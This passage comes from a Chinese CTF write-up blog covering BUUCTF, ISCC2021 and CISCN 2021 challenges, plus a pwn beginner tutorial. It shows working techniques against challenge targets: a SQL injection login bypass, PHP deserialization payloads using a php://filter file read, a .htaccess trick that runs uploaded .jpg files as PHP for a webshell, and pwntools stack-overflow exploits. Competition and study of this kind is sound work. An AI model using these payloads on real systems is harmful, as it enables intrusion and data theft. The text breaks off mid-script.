class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;#<br></code></pre></td></tr></table></figure><p>flag{b908a76a-9666-4b0d-a5e9-c1f45b265f4e}</p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>:  admin&#x27; union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;<span class="hljs-number">68053</span>af<span class="hljs-number">2923</span>e<span class="hljs-number">00204</span>c<span class="hljs-number">3</span>ca<span class="hljs-number">7</span>c<span class="hljs-number">6</span>a<span class="hljs-number">3150</span>cf<span class="hljs-number">7</span>&#x27;#<br><span class="hljs-attribute">password</span>:  <span class="hljs-number">789</span><br></code></pre></td></tr></table></figure><p>flag{03f63296-0154-4e71-9c57-54d3d44f71ad}</p><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>反序列化，要绕过process。</p><p><img src="/2021/05/31/buuctf-web-1/image-20210518214941100.png" alt="image-20210518214941100"></p><p>传入数字2进行绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> FileHandler();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br>O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Hello%20World!&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>flag{81940b5b-ace0-48ad-8403-3e605be41798}</p><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>改为jpg后缀传文件，</p><p>再创建.htaccess文件，将jpg解析为php。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>传一句话马。</p><p><img src="/2021/05/31/buuctf-web-1/image-20210518222025477.png" alt="image-20210518222025477"></p>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-pwn-1</title>
    <link href="/2021/05/31/buuctf-pwn-1/"/>
    <url>/2021/05/31/buuctf-pwn-1/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>11.28125转为二进制</p><p><img src="/2021/05/31/buuctf-pwn-1/image-20201130202800389.png" alt="image-20201130202800389"></p><p>显而易见，</p><p>我们需要去覆盖v2为11.2815，首先需要了解一下浮点数转16进制。</p><p><a href="https://www.cnblogs.com/mlgjb/p/8318436.html">https://www.cnblogs.com/mlgjb/p/8318436.html</a></p><p>11.2815</p><p>11转为二进制</p><p>1011</p><p>0.2815求得二进制</p><p>01100010000000100000000</p><p>最后得</p><p>01000001001101001000000000000000 转为16进制 0x41348000</p><p>exp:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">io</span> = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>, <span class="hljs-number">27962</span>)<br><br><span class="hljs-attribute">payload</span> = b&#x27;A&#x27;*(<span class="hljs-number">0</span>x<span class="hljs-number">30</span>-<span class="hljs-number">4</span>) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">41348000</span>)<br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC2021娱乐</title>
    <link href="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/"/>
    <url>/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ISCC客服冲冲冲（一）"><a href="#ISCC客服冲冲冲（一）" class="headerlink" title="ISCC客服冲冲冲（一）"></a>ISCC客服冲冲冲（一）</h2><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210511204402437.png" alt="image-20210511204402437.png"></p><p>将两个点击时间的ID互换。</p><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210511204424387.png" alt="image-20210511204424387.png"></p><p>ISCC{1SCC_2o2l_KeFuu}</p><h2 id="这是啥"><a href="#这是啥" class="headerlink" title="这是啥"></a>这是啥</h2><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210511205142636.png" alt="image-20210511205142636.png"></p><p>复制JS代码，控制台运行。</p><p>ISCC{what_is*_jsJS&amp;}</p><h2 id="Web01"><a href="#Web01" class="headerlink" title="Web01"></a>Web01</h2><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210511210025764.png" alt="image-20210511210025764.png"></p><p>科学计数法，%00截断。</p><h2 id="ISCC客服一号冲冲冲（二）"><a href="#ISCC客服一号冲冲冲（二）" class="headerlink" title="ISCC客服一号冲冲冲（二）"></a>ISCC客服一号冲冲冲（二）</h2><h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Mobile-Easy"><a href="#Mobile-Easy" class="headerlink" title="Mobile Easy"></a>Mobile Easy</h2><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210512175514207.png" alt="image-20210512175514207.png"></p><p>得到secondStr：+0dNlE8us8</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs css">for <span class="hljs-selector-tag">i</span> in range(<span class="hljs-number">256</span>):<br>    if i % <span class="hljs-number">8</span> == <span class="hljs-number">7</span> and i % <span class="hljs-number">9</span> == <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">100</span>+<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">100</span>^<span class="hljs-number">93</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((<span class="hljs-number">100</span>^<span class="hljs-number">93</span>)*<span class="hljs-number">2</span>-<span class="hljs-number">10</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">120</span>-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>+<span class="hljs-number">4</span>+<span class="hljs-number">24</span>))<br># for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>#     for j in <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>#         if i ^ j == <span class="hljs-number">56</span> and i - j == <span class="hljs-number">24</span>:<br>#             v10 = j<br>#             <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),<span class="hljs-built_in">chr</span>(j),end=<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>+<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ISCC&#123;+0dNlE8us8Gg9hwlTP&#125;&#x27;</span>.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;dN&quot;</span>, <span class="hljs-string">&quot;B1&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;hwl&quot;</span>, <span class="hljs-string">&quot;rea&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>))<br></code></pre></td></tr></table></figure><p>ISCC{m0B1lE_1s_Gg9reaT!}</p><h2 id="OHHH"><a href="#OHHH" class="headerlink" title="OHHH"></a>OHHH</h2><p>libnc.so里是主要java层逻辑。</p><p>check1在libLibs.so中。</p><p>经过hook测试，check1: 6个小写字母</p><p>而且必须满足一些条件：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> hashlib<br><span class="hljs-attribute">import</span> string<br><br><span class="hljs-attribute">s</span> = string.ascii_lowercase<br><span class="hljs-attribute">d</span> = <span class="hljs-number">0</span><br><span class="hljs-attribute">for</span> i<span class="hljs-number">1</span> in s:<br>    <span class="hljs-attribute">for</span> i<span class="hljs-number">2</span> in s:<br>        <span class="hljs-attribute">for</span> i<span class="hljs-number">3</span> in s:<br>            <span class="hljs-attribute">for</span> i<span class="hljs-number">4</span> in s:<br>                <span class="hljs-attribute">for</span> i<span class="hljs-number">5</span> in s:<br>                    <span class="hljs-attribute">for</span> i<span class="hljs-number">6</span> in s:<br>                        <span class="hljs-attribute">ss</span> = i<span class="hljs-number">1</span>+i<span class="hljs-number">2</span>+i<span class="hljs-number">3</span>+i<span class="hljs-number">4</span>+i<span class="hljs-number">5</span>+i<span class="hljs-number">6</span><br>                        <span class="hljs-attribute">a</span> = hashlib.md<span class="hljs-number">5</span>()<br>                        <span class="hljs-attribute">a</span>.update(ss.encode(encoding=&#x27;utf-<span class="hljs-number">8</span>&#x27;))<br>                        <span class="hljs-attribute">aa</span> = a.hexdigest()<br>                        <span class="hljs-attribute">b</span> = <span class="hljs-number">0</span><br>                        <span class="hljs-attribute">c</span> = <span class="hljs-number">0</span><br>                        <span class="hljs-attribute">d</span> = <span class="hljs-number">0</span><br>                        <span class="hljs-attribute">for</span> i in aa:<br>                            <span class="hljs-attribute">if</span> i == <span class="hljs-string">&quot;0&quot;</span>:<br>                                <span class="hljs-attribute">c</span> += <span class="hljs-number">1</span><br>                                <span class="hljs-attribute">d</span> += b<br>                            <span class="hljs-attribute">b</span> += <span class="hljs-number">1</span><br>                        <span class="hljs-attribute">if</span> d + c * <span class="hljs-number">10</span> == <span class="hljs-number">403</span>:<br>                            <span class="hljs-attribute">print</span>(d + c*<span class="hljs-number">10</span>)<br>                            <span class="hljs-attribute">print</span>(ss, aa)<br><span class="hljs-comment"># 403</span><br><span class="hljs-comment"># ozulmt 0ec448d42dbf0000c020c0000048010e</span><br></code></pre></td></tr></table></figure><p>最后根据生成的数字作为索引，打乱md5加密的值。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sss = [<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>]<br>a = [6,10,11,4,5,7,13,7,2,2,3,5,8,3,11,10,10,4,6,13,8,11,2,12,11,1,12,3,12,4,0,6]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-builtin-name">print</span>(sss[i],<span class="hljs-attribute">end</span>=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>ISCC{6ab457d7223583baa46d8b2cb1c3c406}</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="李华的红包"><a href="#李华的红包" class="headerlink" title="李华的红包"></a>李华的红包</h2><p>16进制数据看到了rar，</p><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210517131728800.png" alt="image-20210517131728800"></p><p>修改后缀解压得到txt文件。</p><p>棋盘密码。得到ISCCBFS。</p><p>ISCC{ISCCBFS}</p><h2 id="Retrieve-the-passcode"><a href="#Retrieve-the-passcode" class="headerlink" title="Retrieve the passcode"></a>Retrieve the passcode</h2><p>画坐标点。</p><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210517134658641.png" alt="image-20210517134658641"></p><p>365728 解密压缩包，得到pdf。</p><p>摩斯密码解密。</p><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210517135009892.png" alt="image-20210517135009892"></p><p>ISCC{congratulationtheflagischallengeiscctwozerotwoone}</p><h2 id="海市蜃楼-1"><a href="#海市蜃楼-1" class="headerlink" title="海市蜃楼-1"></a>海市蜃楼-1</h2><p>解压文档，在document.xml中发现flag。</p><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210517143223338.png" alt="image-20210517143223338"></p><p>ISCC{zheshishui}</p><h2 id="美人计"><a href="#美人计" class="headerlink" title="美人计"></a>美人计</h2><p>解码。</p><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210517143549342.png" alt="image-20210517143549342"></p><p><img src="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/image-20210517155330298.png" alt="image-20210517155330298"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Garden"><a href="#Garden" class="headerlink" title="Garden"></a>Garden</h2><p>pyc在线反编译写脚本解密。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">f</span> = &#x27;<span class="hljs-number">2</span>(<span class="hljs-number">88</span>\x<span class="hljs-number">006</span>\x<span class="hljs-number">1</span>a\x<span class="hljs-number">10</span>\x<span class="hljs-number">10</span>\x<span class="hljs-number">1</span>aIKIJ+\x<span class="hljs-number">1</span>a\x<span class="hljs-number">10</span>\x<span class="hljs-number">10</span>\x<span class="hljs-number">1</span>a\x<span class="hljs-number">06</span>&#x27;<br><span class="hljs-attribute">alphabet</span> = set(&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="hljs-number">0123456789</span>&#123;&#125;!@#$%+&#x27;)<br><span class="hljs-attribute">flag</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">for</span> i in f:<br>    <span class="hljs-attribute">for</span> j in alphabet:<br>        <span class="hljs-attribute">if</span> (ord(i) ^ ord(j)) != <span class="hljs-number">123</span>:<br>            <span class="hljs-attribute">continue</span><br>        <span class="hljs-attribute">else</span>:<br>            <span class="hljs-attribute">flag</span> += j<br>            <span class="hljs-attribute">break</span><br><span class="hljs-attribute">print</span>(flag)<br></code></pre></td></tr></table></figure><p>ISCC{Makka2021Pakka}</p><h2 id="nintendo-player"><a href="#nintendo-player" class="headerlink" title="nintendo player"></a>nintendo player</h2>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn入门学习</title>
    <link href="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>pwn，它还是来了，从CTF学起，<a href="https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/basic_rop/">https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/basic_rop/</a></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>安装docker。</p><p>导入镜像：<code>cat ubuntu.17.04.amd64.tar | docker import - ubuntu/17.04.amd64</code></p><p>docker命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>导入镜像：docker import - ubuntu/<span class="hljs-number">17.04</span>.amd64<br><span class="hljs-regexp">//</span>运行镜像：docker run -it -p <span class="hljs-number">23946</span>:<span class="hljs-number">23946</span> ubuntu<span class="hljs-regexp">/17.04.amd64 /</span>bin/bash<br>  会创建一个docker容器，第一个端口是宿主机的端口，第二个是容器的端口<br><span class="hljs-regexp">//</span>列出容器：docker container ls -a<br><span class="hljs-regexp">//</span>容器重命名：docker container rename old_name new_name<br><span class="hljs-regexp">//</span>打开容器的shell：docker exec -it container_name <span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-regexp">//</span>启动容器：docker start container_name<br><span class="hljs-regexp">//</span>复制：docker container cp file_name container_name:/root<br><br><span class="hljs-regexp">//</span>导入镜像<br>docker load -i nginx.tar<br><span class="hljs-regexp">//</span>导出镜像<br>docker save -o nginx.tar nginx:latest<br></code></pre></td></tr></table></figure><p>将对应版本的ida server复制到容器中，运行使用IDA进行调试。下载pwntools。</p><p>在容器中映射程序端口：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> tcp-listen:<span class="hljs-number">10001</span>,reuseaddr,fork EXEC:./heapTest_x<span class="hljs-number">86</span>,pty,raw,echo=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213800491.png" alt="image-20210521213800491"></p><p>开启pwntools：</p><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213743741.png" alt="image-20210521213743741"></p><p>使用IDA附加程序，</p><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213949843.png" alt="image-20210521213949843"></p><p>在python中输入io.recv()可以接收程序的输出。</p><p>使用io.send()可以发送数据给程序，发送数据后需要再发送<code>\n</code>执行回车。或者直接使用sendline()。</p><p>程序成功断下来。</p><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521214305481.png" alt="image-20210521214305481"></p><p>结束时，要使用io.close()关闭io。</p><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521214401818.png" alt="image-20210521214401818"></p><h1 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h1><p>call hello等价于<code>push eip; mov eip, [hello]</code></p><p>leave指令相当于<code>add esp, xxh; mov esp, ebp; pop ebp</code></p><p>栈溢出就是输入超长度的字符串使分配的栈帧溢出以达到控制eip执行的目的。</p><p>下断点：</p><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521215802315.png" alt="image-20210521215802315"></p><p>调试并分析代码，可以这样得出偏移：</p><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521221119660.png" alt="image-20210521221119660"></p><p>r处是返回地址，也就是我们要覆盖r，所以需要输入22字节以上才可以覆盖r。</p><p>在容器中映射端口运行程序：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> tcp-listen:<span class="hljs-number">10001</span>,reuseaddr,fork EXEC:./hello,pty,raw,echo=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>找到getshell函数的地址，用pwntools写脚本：</p><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521221251779.png" alt="image-20210521221251779"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&#x27;172.17.0.3&#x27;</span>,<span class="hljs-number">10001</span>)<br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">22</span> + p32(<span class="hljs-number">0x0804846b</span>)<br><span class="hljs-built_in">io</span>.send(payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="ROP技术"><a href="#ROP技术" class="headerlink" title="ROP技术"></a>ROP技术</h2><p>程序0保护，往往是很容易攻破的，NX保护即栈不可执行，此时就需要使用ROP(Return Oriented Programming)技术绕过保护。主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210728182503328-7467905.png" alt="image-20210728182503328"></p><p>只开启了NX，IDA看看为代码：</p><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210728182541456.png" alt="image-20210728182541456"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">找到了后门函数<br>gdb启动，溢出点确认。<br>cyclic <span class="hljs-number">100</span><br>cyclic -l xxxx得出栈溢出偏移是<span class="hljs-number">112</span><br>写出<span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span> + p32(<span class="hljs-number">0x804863a</span>)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup,pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN-2021-wp</title>
    <link href="/2021/05/30/CISCN-2021-wp/"/>
    <url>/2021/05/30/CISCN-2021-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h1><p>so文件主要逻辑。</p><p>先dump数据，</p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210515130254705.png" alt="image-20210515130254705"></p><p>然后写脚本恢复rc4加密后的结果，</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">a = [<span class="hljs-number">0xa3</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0xbb</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x84</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0xc2</span>,<span class="hljs-number">0xad</span>,<span class="hljs-number">0xad</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x8e</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0xeb</span>,<span class="hljs-number">0xaf</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0xea</span>,<span class="hljs-number">0xc4</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-number">0xd3</span>,<span class="hljs-number">0xcc</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0xf9</span>,<span 